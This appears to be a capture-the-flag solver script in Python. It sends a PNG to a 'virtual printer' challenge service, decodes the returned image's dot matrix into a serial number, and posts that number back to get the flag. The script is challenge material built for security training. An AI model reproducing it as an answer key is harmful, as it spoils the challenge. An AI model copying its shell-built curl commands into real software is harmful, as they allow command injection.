#!/usr/bin/env python3
# -!- encoding:utf8 -!-
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#    file: exploit
#    date: 2017-09-27
#  author: paul.dautry
# purpose:
#
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#===============================================================================
# IMPORTS
#===============================================================================
import os
import base64
import os.path as path
from PIL import Image
from ruamel import yaml
from argparse import ArgumentParser
from subprocess import check_output
#===============================================================================
# GLOBALS / CONFIG
#===============================================================================
DEBUG = False
# you must identify these values (50, 20, 64 and 8) through image observation use GIMP.
MAT_OE = 50
MAT_OD = 20
MAT_W = 64
MAT_H = 8
# you must identify these values (255, 255, 204) through image observation use GIMP.
DOT_R = 255
DOT_G = 255
DOT_B = 204
#===============================================================================
# CLASSES
#===============================================================================
class Exploit(object):
    ##
    ## @brief      Constructs the object.
    ##
    ## @param      png_file  The png file
    ## @param      host      The host
    ## @param      port      The port
    ##
    def __init__(self, host=None, port=None, png_file=None):
        super(Exploit, self).__init__()
        self.host = host
        self.port = port
        self.png_file = png_file
        self.tmp_page = '/tmp/vps-exploit.png'
        self.print_url = 'http://{}:{}/print'.format(host, port)
        self.sn_url = 'http://{}:{}/serial-number'.format(host, port)
    ##
    ## @brief      Prints a png using virtual printer
    ##
    def __print_png(self):
        cmd = 'curl -X POST --form "f=@{}" {}'.format(self.png_file,
                                                      self.print_url)
        output = check_output(cmd, shell=True)
        print(output)
        with open(self.tmp_page, 'wb') as o:
            o.write(output)
    ##
    ## @brief      Extracts data from received image
    ##
    def __extract_data(self):
        img = Image.open(self.tmp_page)
        # you must identify these values (50, 20, 64 and 8) through image observation use GIMP.
        cimg = img.crop((MAT_OE,
                         MAT_OE,
                         MAT_OE+MAT_OD*MAT_W,
                         MAT_OE+MAT_OD*MAT_H))
        cimg.save('/tmp/exploit.cropped.png')
        (w, h) = cimg.size
        pixels = list(cimg.getdata())
        # 8 x 64 dot matrix fill it with one and zeros
        self.mat = [ [ 0 for c in range(0, MAT_W) ] for r in range(0, MAT_H) ]
        for r in range(0, MAT_H):
            for c in range(0, MAT_W):
                (red, green, blue) = pixels[r * w * MAT_OD + c * MAT_OD ]
                if red == DOT_R and green == DOT_G and blue == DOT_B:
                    self.mat[r][c] = 1
    ##
    ## @brief      Sends a serial number to the server.
    ##
    def __send_serial_number(self):
        ba = []
        # rebuild bytes
        for c in range(0, MAT_W):
            o = 0
            for r in range(0, MAT_H):
                o |= self.mat[r][c] << (7-r)
            ba.append(o)
        data = bytes(ba)
        sn_dat = data.split(b'\n')[2]
        sn_b64 = base64.b64encode(sn_dat[4:])
        #Â post serial number and get a flag
        cmd = 'curl -X POST --data "sn={}" {}'.format(sn_b64.decode(),
                                                      self.sn_url)
        output = check_output(cmd, shell=True)
        flag = output.split(b': ')[-1]
        return flag
    ##
    ## @brief      Runs the exploit
    ##
    def run(self):
        print('[exploit]> sending PNG file for printing...')
        self.__print_png()
        print('[exploit]> extracting data from dot matrix...')
        self.__extract_data()
        print('[exploit]> sending serial number...')
        flag = self.__send_serial_number()
        print('[exploit]> flag: {}'.format(flag))
        return True
#==============================================================================
# FUNCTIONS
#==============================================================================
#==============================================================================
# SCRIPT
#==============================================================================
if __name__ == '__main__':
    wd = path.dirname(__file__) # != os.getcwd()

    with open(path.join(os.getcwd(), '.mkctf.yml')) as f:
        conf = yaml.safe_load(f)

    parameters = conf['parameters']

    p = ArgumentParser(add_help=True, description="Exploits virtual printer.")
    p.add_argument('--host', default=parameters['exploit']['host'],
                   help="")
    p.add_argument('--port', default=parameters['port'],
                   help="")
    p.add_argument('--png-file', default=parameters['exploit']['png-file'],
                   help="")
    args = p.parse_args()

    e = Exploit(args.host, args.port, args.png_file)

    exit(0 if e.run() else 10)
